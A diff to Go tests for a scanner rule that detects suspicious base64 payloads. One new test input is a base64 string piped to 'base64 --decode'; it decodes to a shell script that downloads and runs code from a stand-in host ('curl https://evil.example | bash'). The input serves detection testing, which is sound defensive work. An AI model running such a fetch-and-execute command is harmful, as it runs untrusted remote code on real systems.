@@ -16,13 +16,18 @@ func Test_NoSuspiciousBase64_Metadata(t *testing.T) {
 }
 
 func Test_NoSuspiciousBase64_Evaluate_DetectsLongPayload(t *testing.T) {
-	findings := evaluateRule(t, "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0MTIzNDU2")
+	findings := evaluateRule(t, "echo IyEvYmluL3NoCmN1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUgfCBiYXNo | base64 --decode")
 	require.Len(t, findings, 1)
 	assert.Equal(t, "Suspicious base64-like payload detected", findings[0].Message)
 }
 
 func Test_NoSuspiciousBase64_Evaluate_IgnoresShortPayload(t *testing.T) {
 	findings := evaluateRule(t, "SGVsbG8gd29ybGQ=")
+	assert.Empty(t, findings)
+}
+
+func Test_NoSuspiciousBase64_Evaluate_IgnoresLowEntropyBlobWithoutDecoder(t *testing.T) {
+	findings := evaluateRule(t, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
 	assert.Empty(t, findings)
 }
 
